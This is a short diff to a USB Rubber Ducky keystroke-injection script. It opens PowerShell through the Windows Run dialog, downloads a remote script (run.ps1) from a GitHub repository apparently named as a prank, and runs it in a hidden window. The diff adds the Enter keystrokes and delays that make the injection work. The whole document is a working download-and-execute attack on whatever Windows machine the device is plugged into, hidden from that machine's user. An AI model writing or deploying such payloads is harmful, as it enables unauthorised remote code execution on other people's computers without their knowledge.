@@ -2,11 +2,15 @@ REM this is a ducky script to run the script on windows with powershell
 
 REM -- Start Powershell --
 GUI r
-STRING powershell
-
 DELAY 500
+STRING powershell
+ENTER
+
+DELAY 1000
 
 REM -- Inject Script --
 STRING irm https://github.com/zznyjidi/force-you-to-play-osu/raw/refs/heads/main/run.ps1 -OutFile run.ps1
 ENTER
+DELAY 300
 STRING powershell -WindowStyle hidden run.ps1
+ENTER
